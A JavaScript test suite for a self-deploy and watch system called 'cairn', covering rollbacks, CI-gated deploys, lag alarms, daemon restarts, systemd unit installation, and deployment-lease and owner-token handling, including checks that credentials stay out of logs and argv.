test('a rollback persists the restored phase before starting the previous build', () => {
  const f = fixture();
  const target = pushTarget(f);
  writeFileSync(join(f.fake, 'broken-sha'), target);
  writeFileSync(join(f.fake, 'phase-on-start'), '');
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 1, result.stderr);
  assert.deepEqual(f.log('phases.log').trim().split('\n'), [
    'start cairn-server.service @ switching',
    'start cairn-server.service @ restored',
    'start cairn-daemon.service @ restored',
  ]);
});

test('does not treat a checkout at the target as deployed without a record and a healthy server', () => {
  const f = fixture();
  const target = pushTarget(f);
  git(f.checkout, 'fetch', '-q', 'origin', 'main');
  git(f.checkout, 'checkout', '-q', '--detach', target);
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 1, result.stderr);
  assert.match(result.stderr, /without a deploy record/);
});

test('watch deploys the newest green main commit and skips a SHA that already failed', () => {
  const f = fixture();
  const green = pushTarget(f, 'green');
  const red = pushTarget(f, 'red');
  writeFileSync(
    join(f.fake, `checks-${red}`),
    'check\tfailure\npack-smoke\tsuccess\ne2e-gate\tsuccess\n',
  );
  const result = f.run(WATCH, [], { CAIRN_DEPLOY_SCRIPT: DEPLOY });
  assert.equal(result.status, 0, result.stderr);
  assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), green);

  const next = pushTarget(f, 'next');
  mkdirSync(join(f.state, 'failed'), { recursive: true });
  writeFileSync(join(f.state, 'failed', next), 'health check failed\n');
  const skipped = f.run(WATCH, [], { CAIRN_DEPLOY_SCRIPT: DEPLOY });
  assert.equal(skipped.status, 0, skipped.stderr);
  assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), green);
  assert.match(skipped.stderr, /already failed/);
});

test('watch skips a newest main commit whose ci run was cancelled and deploys the newest green one', () => {
  const f = fixture();
  const green = pushTarget(f, 'green');
  const cancelled = pushTarget(f, 'cancelled');
  writeFileSync(
    join(f.fake, `checks-${cancelled}`),
    'check\tcancelled\npack-smoke\tcancelled\ne2e-gate\tcancelled\n',
  );
  const result = f.run(WATCH, [], { CAIRN_DEPLOY_SCRIPT: DEPLOY });
  assert.equal(result.status, 0, result.stderr);
  assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), green);
  const newest = pushTarget(f, 'newest');
  const next = f.run(WATCH, [], { CAIRN_DEPLOY_SCRIPT: DEPLOY });
  assert.equal(next.status, 0, next.stderr);
  assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), newest);
});

test('watch raises one lag alarm per main head after two hours and closes it once caught up', () => {
  const f = fixture();
  const old = new Date(Date.now() - 3 * 3600 * 1000).toISOString();
  const stale = pushTarget(f, 'stale', { date: old });
  writeFileSync(join(f.fake, `checks-${stale}`), 'check\tfailure\n');
  const env = { CAIRN_DEPLOY_SCRIPT: DEPLOY };
  assert.equal(f.run(WATCH, [], env).status, 0);
  assert.match(f.log('gh.log'), /gh issue create .*deploy lag/);
  assert.equal(f.run(WATCH, [], env).status, 0);
  assert.equal(f.log('gh.log').match(/gh issue (create|comment)/g).length, 1);

  writeFileSync(join(f.fake, 'lag-issue'), '77\n');
  const fixed = pushTarget(f, 'fixed');
  assert.equal(f.run(WATCH, [], env).status, 0);
  assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), fixed);
  assert.match(f.log('gh.log'), /gh issue close 77/);
});

test('watch stays quiet when the undeployed commit is younger than the limit', () => {
  const f = fixture();
  const fresh = pushTarget(f, 'fresh');
  writeFileSync(join(f.fake, `checks-${fresh}`), 'check\tfailure\n');
  assert.equal(f.run(WATCH, [], { CAIRN_DEPLOY_SCRIPT: DEPLOY }).status, 0);
  assert.doesNotMatch(f.log('gh.log'), /issue (create|comment)/);
});

for (const broken of [false, true]) {
  test(`restarts the enabled Orb daemon during deploy and rollback: ${broken}`, () => {
    const f = fixture();
    const target = pushTarget(f);
    writeFileSync(join(f.fake, 'orb-enabled'), '');
    mkdirSync(join(f.state, 'alarms'), { recursive: true });
    for (const action of ['start', 'stop']) {
      writeFileSync(join(f.state, 'alarms', `orb-unit-${action}-failed`), '');
    }
    if (broken) writeFileSync(join(f.fake, 'broken-sha'), target);
    const result = f.run(DEPLOY, [target]);
    assert.equal(result.status, broken ? 1 : 0, result.stderr);
    const calls = f.log('systemctl.log').trim().split('\n');
    assert.ok(calls.includes('systemctl --user stop cairn-daemon-orb.service'));
    assert.ok(calls.includes('systemctl --user start cairn-daemon-orb.service'));
    assert.ok(
      calls.indexOf('systemctl --user start cairn-daemon-orb.service') >
        calls.indexOf('systemctl --user start cairn-server.service'),
    );
    for (const action of ['start', 'stop']) {
      assert.equal(existsSync(join(f.state, 'alarms', `orb-unit-${action}-failed`)), false);
    }
  });
}

test('Orb failures alert again after recovery while persistent failures stay deduplicated', () => {
  const f = fixture();
  writeFileSync(join(f.fake, 'orb-enabled'), '');
  for (const action of ['start', 'stop', 'restart']) {
    writeFileSync(join(f.fake, `orb-${action}-fail`), '');
  }
  for (const name of ['first failure', 'persistent failure']) {
    const result = f.run(DEPLOY, [pushTarget(f, name)]);
    assert.equal(result.status, 0, result.stderr);
    assert.equal(f.log('gh.log').match(/gh issue (create|comment)/g).length, 2);
    for (const action of ['start', 'stop']) {
      assert.equal(existsSync(join(f.state, 'alarms', `orb-unit-${action}-failed`)), true);
    }
  }
  for (const action of ['start', 'stop', 'restart']) unlinkSync(join(f.fake, `orb-${action}-fail`));
  const unrelated = join(f.state, 'alarms', 'deploy-lag');
  writeFileSync(unrelated, '');
  const recovered = f.run(DEPLOY, [pushTarget(f, 'recovered')]);
  assert.equal(recovered.status, 0, recovered.stderr);
  assert.deepEqual(readdirSync(join(f.state, 'alarms')), ['deploy-lag']);
  for (const action of ['start', 'stop', 'restart']) {
    writeFileSync(join(f.fake, `orb-${action}-fail`), '');
  }
  const failedAgain = f.run(DEPLOY, [pushTarget(f, 'failed again')]);
  assert.equal(failedAgain.status, 0, failedAgain.stderr);
  assert.equal(f.log('gh.log').match(/gh issue (create|comment)/g).length, 4);
  assert.equal(existsSync(unrelated), true);
});

test('repeated Orb stop failures restart the unit and keep one deduplicated stop alarm', () => {
  const f = fixture();
  writeFileSync(join(f.fake, 'orb-enabled'), '');
  writeFileSync(join(f.fake, 'orb-stop-fail'), '');
  writeFileSync(join(f.fake, 'orb-restart-fail'), '');
  for (const name of ['first', 'second']) {
    const result = f.run(DEPLOY, [pushTarget(f, name)]);
    assert.equal(result.status, 0, result.stderr);
    assert.equal(existsSync(join(f.state, 'alarms', 'orb-unit-stop-failed')), true);
  }
  const calls = f.log('systemctl.log').trim().split('\n');
  assert.ok(calls.includes('systemctl --user restart cairn-daemon-orb.service'));
  assert.ok(!calls.includes('systemctl --user start cairn-daemon-orb.service'));
  assert.equal(f.log('gh.log').match(/gh issue (create|comment)/g).length, 2);
});

test('a failed Orb stop followed by a successful restart clears only what recovered', () => {
  const f = fixture();
  writeFileSync(join(f.fake, 'orb-enabled'), '');
  writeFileSync(join(f.fake, 'orb-stop-fail'), '');
  mkdirSync(join(f.state, 'alarms'), { recursive: true });
  writeFileSync(join(f.state, 'alarms', 'orb-unit-start-failed'), '');
  const result = f.run(DEPLOY, [pushTarget(f, 'restart recovers')]);
  assert.equal(result.status, 0, result.stderr);
  assert.ok(f.log('systemctl.log').includes('systemctl --user restart cairn-daemon-orb.service'));
  assert.equal(existsSync(join(f.state, 'alarms', 'orb-unit-stop-failed')), false);
  assert.equal(existsSync(join(f.state, 'alarms', 'orb-unit-start-failed')), false);
});

for (const action of ['start', 'stop']) {
  test(`an Orb ${action} failure alerts without rolling back a healthy deploy`, () => {
    const f = fixture();
    const target = pushTarget(f);
    writeFileSync(join(f.fake, 'orb-enabled'), '');
    writeFileSync(join(f.fake, `orb-${action}-fail`), '');
    const result = f.run(DEPLOY, [target]);
    assert.equal(result.status, 0, result.stderr);
    assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), target);
    assert.equal(JSON.parse(readFileSync(join(f.state, 'deployed.json'))).result, 'deployed');
    assert.match(result.stderr, new RegExp(`orb-unit-${action}-failed`));
    assert.match(f.log('gh.log'), /gh issue create .*Orb daemon/);
    assert.equal(existsSync(join(f.state, 'failed', target)), false);
    assert.doesNotMatch(result.stdout, /rolling back|restarting/);
  });
}

for (const script of [DEPLOY, WATCH]) {
  test(`${script.endsWith('deploy-self.sh') ? 'deployment' : 'watch'} scopes App credentials to individual gh calls`, () => {
    const f = fixture();
    const target = pushTarget(f);
    const result = f.run(script, script === DEPLOY ? [target] : [], {
      CAIRN_DEPLOY_SCRIPT: DEPLOY,
      GH_TOKEN: 'fixture-inherited-app-token',
      GITHUB_TOKEN: 'fixture-inherited-github-token',
      GIT_CONFIG_COUNT: '1',
      GIT_CONFIG_KEY_0: 'http.https://example.invalid/.extraheader',
      GIT_CONFIG_VALUE_0: 'Authorization: fixture-inherited-header',
    });
    assert.equal(result.status, 0, result.stderr);
    assert.equal(f.log('artifact-credential-names'), '');
    assert.ok(f.log('gh-auth.log').trim().split('\n').length > 0);
    assert.equal(
      f.log('gh-auth.log').trim().split('\n').length,
      f.log('gh.log').trim().split('\n').length,
    );
  });
}

test('watch reports failed lag recovery when the identified issue cannot be closed', () => {
  const f = fixture();
  writeFileSync(join(f.fake, 'lag-issue'), '77\n');
  writeFileSync(join(f.fake, 'lag-close-fail'), '');
  const result = f.run(WATCH, [], { CAIRN_DEPLOY_SCRIPT: DEPLOY });
  assert.notEqual(result.status, 0);
  assert.match(result.stdout, /failed to close lag issue #77/);
  assert.doesNotMatch(result.stdout, /closed lag issue/);
  assert.match(f.log('gh.log'), /issue list .*--author @me .*deploy lag/);
});

test('installs bin scripts and user units, reloads systemd and enables only a new timer', () => {
  const f = fixture({
    seedFiles: { 'scripts/ops/host/units/old.service': '[Service]\nExecStart=/bin/true\n' },
  });
  mkdirSync(join(f.dir, '.config/systemd/user'), { recursive: true });
  writeFileSync(
    join(f.dir, '.config/systemd/user/old.service'),
    '[Service]\nExecStart=/bin/true\n',
  );
  const target = pushTarget(f, 'target', {
    files: {
      'scripts/ops/host/bin/cairn-heavy': '#!/bin/bash\necho heavy\n',
      'scripts/ops/host/units/sweep.service': '[Service]\nExecStart=/bin/true\n',
      'scripts/ops/host/units/sweep.timer': '[Timer]\nOnBootSec=5min\n',
      'scripts/ops/host/units/old.service': '[Service]\nExecStart=/bin/false\n',
    },
  });
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 0, result.stderr);
  const bin = join(f.dir, '.local/bin/cairn-heavy');
  assert.equal(readFileSync(bin, 'utf8'), '#!/bin/bash\necho heavy\n');
  assert.equal(statSync(bin).mode & 0o777, 0o755);
  assert.equal(
    readFileSync(join(f.dir, '.config/systemd/user/old.service'), 'utf8'),
    '[Service]\nExecStart=/bin/false\n',
  );
  const calls = f.log('systemctl.log');
  assert.match(calls, /systemctl --user daemon-reload/);
  assert.match(calls, /systemctl --user enable --now sweep\.timer/);
  assert.doesNotMatch(calls, /enable --now old/);
});

test('keeps a hand-edited bin script and reports it', () => {
  const f = fixture();
  mkdirSync(join(f.dir, '.local/bin'), { recursive: true });
  writeFileSync(join(f.dir, '.local/bin/cairn-heavy'), '#!/bin/bash\necho local\n', {
    mode: 0o755,
  });
  const target = pushTarget(f, 'target', {
    files: { 'scripts/ops/host/bin/cairn-heavy': '#!/bin/bash\necho heavy\n' },
  });
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 0, result.stderr);
  assert.equal(
    readFileSync(join(f.dir, '.local/bin/cairn-heavy'), 'utf8'),
    '#!/bin/bash\necho local\n',
  );
  assert.match(f.log('gh.log'), /issue create.*Host tools differ/);
});

test('server-only deploys under continuous active work without stopping either daemon', () => {
  const f = fixture({ claimed: 1, heartbeatAgeMs: 0 });
  writeFileSync(join(f.fake, 'lease-unsupported'), '');
  const target = pushTarget(f, 'server', {
    files: {
      'apps/server/src/probe.ts': 'export {};\n',
      '.claude/skills/verify-cairn/feature-map.json': '{}\n',
      'packages/shared/src/tables.ts': 'export const DB_TABLES = ["deploy_lease"];\n',
      'packages/shared/test/__snapshots__/snapshot.test.ts.snap': 'table registry snapshot\n',
      'marker.txt': 'previous\n',
    },
  });
  const started = Date.now();
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 0, result.stderr);
  assert.ok(Date.now() - started < 10_000);
  assert.doesNotMatch(f.log('systemctl.log'), /(?:stop|start) cairn-daemon/);
  assert.equal(sqlite(f.db, "select status from step where id='s0'"), 'claimed');
});

test('bootstrap stages the target runner before the deployed idle gate can starve the first rollout', () => {
  const f = fixture({
    claimed: 1,
    heartbeatAgeMs: 0,
    seedFiles: {
      'scripts/ops/deploy-self.sh': '#!/bin/bash\necho "busy: 1 step running" >&2\nexit 75\n',
    },
  });
  const target = pushTarget(f, 'server-only bootstrap', {
    files: {
      'marker.txt': 'previous\n',
      'scripts/ops/deploy-self.sh': readFileSync(DEPLOY, 'utf8'),
    },
  });
  writeFileSync(join(f.fake, 'lease-unsupported'), '');
  const old = f.run(join(f.checkout, 'scripts/ops/deploy-self.sh'), [target]);
  assert.equal(old.status, 75, old.stderr);
  const result = f.run(BOOTSTRAP, [target]);
  assert.equal(result.status, 0, result.stderr);
  assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), target);
  assert.equal(sqlite(f.db, "select status from step where id='s0'"), 'claimed');
  assert.doesNotMatch(f.log('systemctl.log'), /(?:stop|start) cairn-daemon/);
  assert.ok(!readdirSync(f.state).some((name) => name.startsWith('deploy-bootstrap.')));
});

test('bootstrap retains the green-check and old-server dispatch gates', () => {
  for (const blocked of ['checks', 'daemon']) {
    const f = fixture({ claimed: 1 });
    const target = pushTarget(f, 'bootstrap', {
      files: { 'scripts/ops/deploy-self.sh': readFileSync(DEPLOY, 'utf8') },
    });
    if (blocked === 'checks') writeFileSync(join(f.fake, `checks-${target}`), 'check\tfailure\n');
    else writeFileSync(join(f.fake, 'lease-unsupported'), '');
    const result = f.run(BOOTSTRAP, [target]);
    assert.equal(result.status, 2, result.stderr);
    assert.match(result.stderr, blocked === 'checks' ? /required check/ : /lease endpoint/);
    assert.equal(f.log('systemctl.log'), '');
    assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), f.previous);
    assert.ok(!readdirSync(f.state).some((name) => name.startsWith('deploy-bootstrap.')));
  }
});

test('every recovery tick drains again after the previous refusal resumed claims', () => {
  const f = fixture();
  const target = pushTarget(f);
  git(f.checkout, 'fetch', '-q', 'origin', 'main');
  git(f.checkout, 'checkout', '-q', '--detach', target);
  mkdirSync(f.state, { recursive: true });
  mkdirSync(f.backups, { recursive: true });
  const snapshot = join(f.backups, 'stopped-expired.db');
  sqlite(f.db, `vacuum into '${snapshot}'`);
  const owner = '00000000-0000-4000-8000-000000000001';
  sqlite(
    f.db,
    `insert into deploy_lease values ('server','${owner}','draining',1);
     insert into step(id,status) values ('new-work','claimed');`,
  );
  writeFileSync(join(f.state, 'lease-owner'), owner);
  writeFileSync(
    join(f.state, 'in-progress'),
    `phase=restored\ntarget=${target}\nprevious=${f.previous}\nsnapshot=${snapshot}\nruntime=daemon\n`,
  );
  for (let tick = 0; tick < 2; tick++) {
    const result = f.run(DEPLOY, ['--recover']);
    assert.notEqual(result.status, 0, result.stderr);
    assert.equal(f.log('systemctl.log'), '', 'recovery must not stop newly claimed work');
    assert.ok(existsSync(join(f.state, 'in-progress')));
    assert.equal(sqlite(f.db, "select status from deploy_lease where id='server'"), 'accepting');
    assert.equal(existsSync(join(f.state, 'lease-owner')), false);
  }
});

test('recovery without an owner marker cannot replace a competing deployment lease', () => {
  const f = fixture();
  const target = pushTarget(f);
  mkdirSync(f.state, { recursive: true });
  const owner = '00000000-0000-4000-8000-000000000002';
  sqlite(
    f.db,
    `insert into deploy_lease values ('server','${owner}','draining',${Date.now() + 60_000})`,
  );
  writeFileSync(
    join(f.state, 'in-progress'),
    `phase=restored\ntarget=${target}\nprevious=${f.previous}\nruntime=daemon\n`,
  );
  const result = f.run(DEPLOY, ['--recover']);
  assert.equal(f.log('systemctl.log'), '');
  assert.equal(result.status, 2, result.stderr);
  assert.equal(sqlite(f.db, "select owner from deploy_lease where id='server'"), owner);
  assert.equal(sqlite(f.db, "select status from deploy_lease where id='server'"), 'draining');
});

test('recovery restores domain data without reviving the snapshot lease owner', () => {
  const f = fixture();
  const target = pushTarget(f);
  git(f.checkout, 'fetch', '-q', 'origin', 'main');
  git(f.checkout, 'checkout', '-q', '--detach', target);
  mkdirSync(f.state, { recursive: true });
  mkdirSync(f.backups, { recursive: true });
  const snapshot = join(f.backups, 'stopped-owner.db');
  const oldOwner = '00000000-0000-4000-8000-000000000001';
  sqlite(
    f.db,
    `insert into deploy_lease values ('server','${oldOwner}','draining',${Date.now() + 3_600_000})`,
  );
  sqlite(f.db, `vacuum into '${snapshot}'`);
  sqlite(f.db, "update deploy_lease set status='accepting',expiresAt=0");
  writeFileSync(join(f.fake, 'broken-sha'), target);
  writeFileSync(
    join(f.state, 'in-progress'),
    `phase=switching\ntarget=${target}\nprevious=${f.previous}\nsnapshot=${snapshot}\nruntime=daemon\n`,
  );
  const result = f.run(DEPLOY, ['--recover']);
  assert.equal(result.status, 1, result.stderr);
  assert.equal(JSON.parse(readFileSync(join(f.state, 'deployed.json'))).result, 'rolled-back');
  assert.notEqual(sqlite(f.db, "select owner from deploy_lease where id='server'"), oldOwner);
  assert.equal(sqlite(f.db, "select status from deploy_lease where id='server'"), 'accepting');
});

for (const failure of [false, true]) {
  test(`continuous traffic drains within the bound and resumes claims after deploy failure=${failure}`, () => {
    const f = fixture({ claimed: 1, heartbeatAgeMs: 0 });
    writeFileSync(join(f.fake, 'continuous'), '');
    const target = pushTarget(f, 'daemon');
    if (failure) writeFileSync(join(f.fake, 'broken-sha'), target);
    const result = f.run(DEPLOY, [target], { CAIRN_DEPLOY_STEP_WAIT_SECONDS: '2' });
    assert.equal(result.status, failure ? 1 : 0, result.stderr);
    assert.ok(existsSync(join(f.fake, 'claims-paused')));
    assert.equal(sqlite(f.db, "select status from deploy_lease where id='server'"), 'accepting');
    assert.match(result.stdout, /claims resumed/);
  });
}

test('daemon changes fail closed against a server without lease support', () => {
  const f = fixture();
  writeFileSync(join(f.fake, 'lease-unsupported'), '');
  const result = f.run(DEPLOY, [pushTarget(f)]);
  assert.equal(result.status, 2, result.stderr);
  assert.match(result.stderr, /lacks the deployment lease endpoint \(HTTP 404\)/);
  assert.equal(f.log('systemctl.log'), '');
});

test('a daemon deploy authenticates every lease request as the owner and keeps the token out of argv', () => {
  const f = fixture();
  const result = f.run(DEPLOY, [pushTarget(f)]);
  assert.equal(result.status, 0, result.stderr);
  assert.deepEqual(
    f
      .log('lease-requests.log')
      .trim()
      .split('\n')
      .map((line) => line.split(' ').slice(0, 2).join(' ')),
    ['GET owner', 'PUT owner', 'DELETE owner'],
  );
  assert.doesNotMatch(
    f.log('lease-requests.log') + result.stdout + result.stderr,
    /fixture-owner-token/,
  );
});

const REJECTED_LEASE_CASES = [
  {
    name: 'the token file has no token value',
    arrange: (f) => writeFileSync(f.tokenFile, '# rotated\nCAIRN_TOKEN=\nCAIRN_TOKEN=later\n'),
    cause: /that file has no CAIRN_TOKEN value/,
  },
  {
    name: 'the health URL is not loopback',
    extra: { CAIRN_HEALTH_URL: 'http://cairn.example.invalid:8787' },
    cause: /it is sent only to a loopback CAIRN_HEALTH_URL/,
  },
  {
    name: 'the token file is missing',
    arrange: (f) => unlinkSync(f.tokenFile),
    cause: /that file is missing or unreadable/,
  },
  {
    name: 'the server does not accept the stored token',
    arrange: (f) => writeFileSync(f.tokenFile, 'CAIRN_TOKEN=stale-owner-token\n'),
    cause: /the server did not accept it/,
  },
];

for (const { name, arrange, extra, cause } of REJECTED_LEASE_CASES) {
  test(`a 401 from the lease request names the cause when ${name}`, () => {
    const f = fixture();
    arrange?.(f);
    const result = f.run(DEPLOY, [pushTarget(f)], extra);
    assert.equal(result.status, 2, result.stderr);
    assert.match(result.stderr, /rejected the deployment lease request \(HTTP 401\)/);
    assert.match(result.stderr, cause);
    assert.doesNotMatch(result.stderr, /lease endpoint|stale-owner-token/);
    assert.match(f.log('lease-requests.log'), /^GET anonymous /);
    assert.equal(f.log('systemctl.log'), '');
  });
}

test('a lease request that gets no response refuses as unreachable, not as a missing endpoint', () => {
  const f = fixture();
  writeFileSync(join(f.fake, 'lease-timeout'), '');
  const result = f.run(DEPLOY, [pushTarget(f)]);
  assert.equal(result.status, 2, result.stderr);
  assert.match(
    result.stderr,
    /refused: no response to the deployment lease request at http:\/\/127\.0\.0\.1:8787/,
  );
  assert.doesNotMatch(result.stderr, /lease endpoint/);
  assert.equal(f.log('systemctl.log'), '');
});

test('daemon changes present the owner token from the token file to a server that requires it', () => {
  const f = fixture();
  writeFileSync(join(f.fake, 'lease-owner-token'), 'owner-secret');
  mkdirSync(join(f.dir, '.cairn'), { recursive: true });
  writeFileSync(join(f.dir, '.cairn', 'token'), '# access token\nCAIRN_TOKEN="owner-secret"\n');
  const target = pushTarget(f);
  const result = f.run(DEPLOY, [target]);
  assert.equal(result.status, 0, result.stderr);
  assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), target);
  assert.equal(sqlite(f.db, "select status from deploy_lease where id='server'"), 'accepting');
});

test('daemon changes name the rejected owner token instead of a missing lease endpoint', () => {
  for (const tokenFile of [null, 'CAIRN_TOKEN=stale\n']) {
    const f = fixture();
    writeFileSync(join(f.fake, 'lease-owner-token'), 'owner-secret');
    const path = join(f.dir, 'elsewhere-token');
    if (tokenFile !== null) writeFileSync(path, tokenFile);
    const result = f.run(DEPLOY, [pushTarget(f)], { CAIRN_DEPLOY_TOKEN_FILE: path });
    assert.equal(result.status, 2, result.stderr);
    assert.match(result.stderr, /rejected the deployment lease request \(HTTP 401\)/);
    assert.ok(result.stderr.includes(path), result.stderr);
    assert.doesNotMatch(result.stderr, /lease endpoint/);
    assert.equal(f.log('systemctl.log'), '');
  }
});

test('bounded drain timeout resumes claims without stopping services and names starvation in the lag alarm', () => {
  const f = fixture({ claimed: 1, heartbeatAgeMs: 0 });
  pushTarget(f, 'daemon', { date: new Date(Date.now() - 3 * 3600_000).toISOString() });
  const result = f.run(WATCH, [], {
    CAIRN_DEPLOY_SCRIPT: DEPLOY,
    CAIRN_DEPLOY_STEP_WAIT_SECONDS: '0',
  });
  assert.equal(result.status, 0, result.stderr);
  assert.match(f.log('gh.log'), /starved: steps never idle/);
  assert.equal(sqlite(f.db, "select status from deploy_lease where id='server'"), 'accepting');
  assert.equal(f.log('systemctl.log'), '');
});

for (const unavailable of [false, true]) {
  test(`failed drain releases claims and wakes pending polls when HTTP is available=${!unavailable}`, () => {
    const f = fixture({ claimed: 1 });
    if (unavailable) writeFileSync(join(f.fake, 'lease-delete-fail'), '');
    const result = f.run(DEPLOY, [pushTarget(f)]);
    assert.equal(result.status, 75, result.stderr);
    assert.equal(sqlite(f.db, "select status from deploy_lease where id='server'"), 'accepting');
    assert.equal(existsSync(join(f.fake, 'claims-woken')), !unavailable);
    assert.equal(existsSync(join(f.state, 'lease-owner')), false);
    assert.equal(f.log('systemctl.log'), '');
  });
}
